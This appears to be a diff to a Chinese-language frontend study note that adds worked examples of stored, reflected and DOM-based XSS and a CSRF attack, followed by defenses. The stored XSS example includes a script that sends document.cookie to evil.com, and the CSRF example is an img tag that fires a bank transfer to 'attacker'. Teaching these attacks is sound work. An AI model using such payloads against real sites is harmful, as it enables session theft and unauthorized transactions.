@@ -43,10 +43,49 @@ js引擎方面：使用事件委托操作dom、使用web worker进行长时间�
 
    `XSS 的本质`是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。
 
-   - **存储型 XSS 攻击**：黑客将恶意代码储存到存在漏洞的服务器，浏览器访问含有恶意代码的页面，浏览器上传用户信息到而已服务器。
-   - **反射型XSS攻击**：用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。
-   - **基于 DOM 的 XSS 攻击**：通过修改原始客户端脚本所使用的DOM环境（在受害者的浏览器中）来执行有效负载。也就是说，页面本身不会更改，但由于对DOM环境的恶意修改，页面中包含的客户端代码以意外的方式运行。
+   - **存储型 XSS 攻击**：攻击代码被 永久存储 在目标服务器（如数据库、日志、评论区）。每次有用户访问相关页面时，恶意脚本都会执行，危害最严重。
+        - 例子:
+            ```html
+            <!-- 一个博客系统的评论功能： -->
+            <!-- 渲染评论时直接输出 -->
+            <div class="comment">{{ content }}</div>
+            <!-- 攻击者提交评论： -->
+            <script>document.location='https://evil.com?c='+document.cookie</script>
+            ```
+            数据库中存储了这段内容。任何访问该博客页面的用户都会加载评论，同时执行脚本。最终攻击者拿到大量用户的 cookie 或 session。
+   - **反射型XSS攻击**：攻击代码通过 URL 参数 或 请求内容 传入，服务器直接将参数内容反射到页面上，而没有进行安全过滤，恶意脚本在页面加载时立即执行
+        - 例子:
 
+            ```html
+            <!-- 网站有一个搜索功能，搜索结果页面直接把 q 参数输出： -->
+            <!-- search.html -->
+            <p>您搜索的关键词是：<span id="kw">{{ q }}</span></p>
+
+            <!-- 攻击者构造一个恶意链接： -->
+            <!-- https://example.com/search?q=<script>alert('XSS!')</script> -->
+
+            <!-- 用户点击后，浏览器解析并执行： -->
+            <p>您搜索的关键词是：<span id="kw"><script>alert('XSS!')</script></span></p>
+            ```
+            结果是用户立刻看到 alert('XSS!')，攻击成功。实际攻击中，攻击者可能会窃取用户的 cookie：
+   - **基于 DOM 的 XSS 攻击**：不依赖服务器返回，而是在 前端 JS 中不安全地使用用户输入。攻击代码直接在浏览器端执行
+        - 例子：
+            ```html
+            <!-- page.html -->
+            <input type="text" id="kw">
+            <button onclick="search()">搜索</button>
+            <div id="result"></div>
+
+            <script>
+            function search() {
+            const kw = document.getElementById("kw").value;
+            document.getElementById("result").innerHTML = "搜索：" + kw;
+            }
+            </script>
+            <!-- 如果用户输入： -->
+            <script>alert('DOM XSS')</script>
+            ```
+            结果 innerHTML 会把脚本当作 HTML 渲染并执行。所以浏览器中立刻弹出 DOM XSS。
    防范:
 
    - 对用户的输入进行转义
@@ -58,6 +97,19 @@ js引擎方面：使用事件委托操作dom、使用web worker进行长时间�
 2. 跨站请求伪造(CSRF:Cross-site request forgery)
 
    解释:攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的
+
+   - 例子：
+        假设银行转账接口是：
+        ```http
+        POST https://bank.com/transfer
+        Content-Type: application/x-www-form-urlencoded
+        to=attacker&amount=1000
+        ```
+        用户在 已登录银行网站 的情况下，访问了攻击者构造的页面：
+        ```html
+        <img src="https://bank.com/transfer?to=attacker&amount=1000">
+        ```
+        浏览器会自动携带 银行的 Cookie，从而发起转账请求。
 
    防范:
 
